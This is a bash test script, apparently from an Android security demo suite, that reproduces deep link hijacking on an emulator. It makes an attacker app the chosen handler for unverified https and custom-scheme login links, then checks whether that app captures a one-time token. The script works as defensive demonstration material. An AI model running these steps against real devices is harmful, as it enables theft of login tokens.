#!/usr/bin/env bash
# Threat 4 (SPEC section 2): hijackable deep links (custom scheme; https without autoVerify). EMULATOR ONLY.
# Not preventable at runtime by the demo app or ShezGuard: the OS decides which app receives the link.
# The attacker app declares the same filters. The script (1) lists which apps can receive each link,
# and (2) delivers the https login link after simulating that the user chose the attacker app for it
# (Android does not pick a handler for an unverified link on its own). The setting is undone at the end.
cd "$(dirname "$0")" && . ./_common.sh
echo "== t4: deep link hijacking (threat 4) =="
require_emulator; require_victim; require_attacker
undo_selection() {
    if [ "$API" -ge 31 ]; then adb_sh pm set-app-links-user-selection --user 0 --package "$ATTACKER" false shezguard.example
    else adb_sh pm set-app-link --user 0 "$ATTACKER" undefined; fi
}
CLEANUP_HOOK=undo_selection
echo "EVIDENCE 1: apps that can receive the custom-scheme login link:"
send "cmd package query-activities --brief -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d 'shezdemo://login?token=x'"
echo "EVIDENCE 2: apps that can receive the https login link:"
send "cmd package query-activities --brief -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d 'https://shezguard.example/login?token=x'"
if [ "$API" -ge 31 ]; then
    echo "EVIDENCE 3: link handling state of the demo app (not verified: it declares no autoVerify):"
    send "pm get-app-links --user 0 $VICTIM"
    send "pm set-app-links-user-selection --user 0 --package $ATTACKER true shezguard.example"
else
    send "pm set-app-link --user 0 $ATTACKER always"
fi
reset_state
TOKEN="CANARY-TOKEN-$$"
echo "ATTACK: a login link with a one-time token, opened like a browser would (no target package)."
send "am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d 'https://shezguard.example/login?token=$TOKEN'"
echo "LOOK FOR: 'ShezAttacker ... HIJACKED ... token=$TOKEN' (the attacker app received the token)."
verdict "ShezAttacker.*HIJACKED.*token=$TOKEN" "($VICTIM/\.demo\.LinkActivity|$ATTACKER/\.HijackActivity)"
